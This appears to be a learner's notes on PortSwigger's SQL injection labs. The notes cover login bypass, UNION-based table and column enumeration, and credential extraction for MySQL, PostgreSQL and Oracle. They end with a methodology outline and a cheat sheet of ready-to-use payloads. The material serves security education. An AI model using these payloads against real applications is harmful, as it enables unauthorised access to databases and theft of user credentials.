# SQL Injection Methods — PortSwigger Labs

---

## What is SQL Injection?
- Inserting malicious SQL code into input fields to manipulate the database query
- Can lead to: authentication bypass, data extraction, data modification, RCE
- One of the most critical and common web vulnerabilities (OWASP Top 10)

---

## Lab 1 — WHERE Clause Bypass

### Concept
Modify a SELECT query's WHERE clause to return unintended data.

### Payload
```sql
' OR 1=1--
```

### How it works
Original query:
```sql
SELECT * FROM products WHERE category = 'Gifts'
```
After injection:
```sql
SELECT * FROM products WHERE category = '' OR 1=1--'
```
`1=1` is always true → returns all rows

---

## Lab 2 — Login Bypass

### Concept
Bypass authentication by commenting out the password check.

### Payload (username field)
```sql
administrator'--
```

### How it works
Original query:
```sql
SELECT * FROM users WHERE username='admin' AND password='password'
```
After injection:
```sql
SELECT * FROM users WHERE username='administrator'--' AND password=''
```
Everything after `--` is commented out → password check skipped

---

## Lab 3 — UNION Attack (Oracle Version Query)

### Concept
Use UNION to append a second SELECT query and extract database version.

### Key Oracle Rules
- Every SELECT must have a FROM clause
- Use `FROM dual` as dummy table
- String concatenation: `'a'||'b'` not `'a'+'b'`

### Steps
```sql
-- Step 1: Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (error = 2 columns)

-- Step 2: Check which columns return text
' UNION SELECT 'a','a' FROM dual--

-- Step 3: Get Oracle version
' UNION SELECT banner,NULL FROM v$version--
```

---

## Lab 4 — UNION Attack (MySQL Version Query)

### Concept
Extract MySQL/MariaDB version using UNION attack.

### Key MySQL Rules
- Comment: `--` or `#`
- Must have space after `--` → use `-- -` or `--+`

### Steps
```sql
-- Step 1: Find columns
' ORDER BY 2--

-- Step 2: Get version
' UNION SELECT @@version,NULL--
```

---

## Lab 5 — Listing Database Contents (Non-Oracle / PostgreSQL)

### Concept
Enumerate all tables and extract credentials from a users table.

### Full Attack Chain
```sql
-- Step 1: Confirm 2 columns, both text
'+UNION+SELECT+'a','a'--

-- Step 2: List all application tables (filter system tables)
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables+WHERE+table_schema='public'--

-- Step 3: Get column names from users table
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_xxxx'--

-- Step 4: Extract credentials
'+UNION+SELECT+username_col,password_col+FROM+users_xxxx--
```

### Key Point
- Always filter by `WHERE table_schema='public'` on PostgreSQL
- Without this you get hundreds of system tables
- The users table will have a randomized suffix e.g. `users_geykji`

---

## Lab 6 — Listing Database Contents (Oracle)

### Concept
Same as Lab 5 but using Oracle-specific system tables.

### Oracle vs PostgreSQL Differences

| Task | PostgreSQL | Oracle |
|---|---|---|
| List tables | `information_schema.tables` | `all_tables` |
| Filter app tables | `WHERE table_schema='public'` | `WHERE owner NOT IN ('SYS','SYSTEM',...)` |
| List columns | `information_schema.columns` | `all_tab_columns` |
| Dummy table | Not needed | `FROM dual` |
| String concat | `\|\|` or `+` | `\|\|` only |

### Full Attack Chain
```sql
-- Step 1: Confirm columns
'+UNION+SELECT+'a','a'+FROM+dual--

-- Step 2: List application tables
'+UNION+SELECT+table_name,NULL+FROM+all_tables+WHERE+owner+NOT+IN+('SYS','SYSTEM','MDSYS','CTXSYS','XDB')--

-- Step 3: Find users table starting with USERS
'+UNION+SELECT+table_name,NULL+FROM+all_tables+WHERE+table_name+LIKE+'USERS%'--

-- Step 4: Get columns
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXXX'--

-- Step 5: Extract credentials
'+UNION+SELECT+username_col,password_col+FROM+USERS_XXXX--
```

---

## UNION Attack Methodology (Universal)

```
Step 1 — Find injection point (', error appears)
Step 2 — Find number of columns (ORDER BY 1, 2, 3... until error)
Step 3 — Find text columns (UNION SELECT 'a',NULL,'a'...)
Step 4 — Identify database type (error messages, version queries)
Step 5 — List tables (information_schema or all_tables)
Step 6 — List columns of target table
Step 7 — Extract data
```

---

## Database Detection Cheatsheet

| Database | Version Query | Comment Syntax | Dummy Table |
|---|---|---|---|
| MySQL | `@@version` | `--` or `#` | Not needed |
| PostgreSQL | `version()` | `--` | Not needed |
| Oracle | `SELECT banner FROM v$version` | `--` | `FROM dual` |
| MSSQL | `@@version` | `--` | Not needed |

---

## Common Payloads Reference

```sql
-- Authentication bypass
' OR 1=1--
' OR 'a'='a
administrator'--

-- Column count
' ORDER BY 1--
' ORDER BY 2--

-- UNION null probing
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- String test
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--

-- Version
' UNION SELECT @@version,NULL--          (MySQL)
' UNION SELECT version(),NULL--          (PostgreSQL)
' UNION SELECT banner,NULL FROM v$version-- (Oracle)

-- List tables (PostgreSQL)
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--

-- List tables (Oracle)
' UNION SELECT table_name,NULL FROM all_tables WHERE table_name LIKE 'USERS%'--

-- List columns
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='target'--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='TARGET'--
```

---

## Tools Used
| Tool | Purpose |
|---|---|
| Burp Suite | Intercept and modify HTTP requests |
| Repeater tab | Modify and resend requests repeatedly |
| FoxyProxy | Route browser traffic through Burp |
| PortSwigger Academy | Free SQLi labs (portswigger.net/web-security) |
